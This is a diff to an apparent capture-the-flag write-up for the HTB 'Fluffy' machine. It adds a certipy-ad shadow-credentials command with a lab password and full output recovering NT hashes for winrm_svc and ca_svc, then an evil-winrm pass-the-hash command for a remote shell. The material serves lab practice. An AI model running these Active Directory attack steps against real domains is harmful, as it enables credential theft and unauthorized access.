@@ -440,5 +440,61 @@ Certipy’s shadow command has an auto action, which will add a new Key Cred
 But make sure to check out the pywhisker method as it explains the whole thing in a way better manner.
 	 Required Tools:  Impacket, certipy-ad 
 ```bash
-certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc 
+certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -ns 10.10.11.69
+```
+
+Output:
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'd56842c9-455e-8f10-da32-a7e1663cbff9'
+[*] Adding Key Credential with device ID 'd56842c9-455e-8f10-da32-a7e1663cbff9' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID 'd56842c9-455e-8f10-da32-a7e1663cbff9' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+```
+Now we got the Hash for winrm_svc Similarly get the hash for ca_svc in this step only
+Output:
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '121025a0-4970-87fd-c845-8230cfcd0567'
+[*] Adding Key Credential with device ID '121025a0-4970-87fd-c845-8230cfcd0567' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '121025a0-4970-87fd-c845-8230cfcd0567' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+
+```
+
+Since we have hash for winrm_svc we can use Evil-winrm to get remote shell as winrm_svc
+```bash
+evil-winrm -i fluffy.htb -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767' -dc-ip 10.10.11.69
 ```
